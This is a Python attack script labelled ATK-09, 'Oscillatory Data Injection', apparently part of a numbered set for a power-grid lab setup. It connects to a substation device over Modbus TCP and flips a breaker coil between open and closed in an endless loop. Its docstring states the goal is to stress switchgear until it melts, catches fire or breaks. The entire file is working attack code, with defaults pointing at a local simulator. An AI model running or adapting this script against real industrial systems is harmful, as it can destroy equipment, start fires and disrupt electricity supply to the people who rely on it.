#!/usr/bin/env python3
"""
ATK-09 | Oscillatory Data Injection
====================================
This attack rapidly flips a breaker open and closed. In the physical world,
manipulating switchgear this quickly rapidly accumulates mechanical stress
and can cause the hardware to melt, catch fire, or physically break down.

Usage
-----
    python atk09_oscillatory_data.py
    python atk09_oscillatory_data.py --target 127.0.0.1 --port 5020 --coil 0 --delay 0.5
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient

def main():
    parser = argparse.ArgumentParser(
        description="ATK-09: Rapidly cycle a breaker to induce mechanical stress."
    )
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus TCP port")
    parser.add_argument("--coil", type=int, default=0, help="Coil address (default 0)")
    parser.add_argument("--delay", type=float, default=0.5, help="Switching state delay in seconds")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-09  |  Oscillatory Data Injection")
    print("=" * 60)
    print(f"[*] Target IED   : {args.target}:{args.port}")
    print(f"[*] Output coil  : address {args.coil}")
    print(f"[*] Switch delay : {args.delay} s")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the stack running?")
        return
        
    print("[*] Starting Oscillatory Data Injection...")
    current_state = True
    
    try:
        while True:
            # Force the breaker to the current state
            client.write_coil(args.coil, current_state)
            state_str = 'TRIPPED (Open)' if current_state else 'CLOSED (Normal)'
            print(f"[*] Forced physical coil {args.coil} to: {state_str}")
            
            # Flip the state for the next iteration
            current_state = not current_state 
            
            # Wait briefly before violently swinging the state back
            time.sleep(args.delay)
            
    except KeyboardInterrupt:
        print("\n[!] Attack halted by user.")
    except Exception as e:
        print(f"\n[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
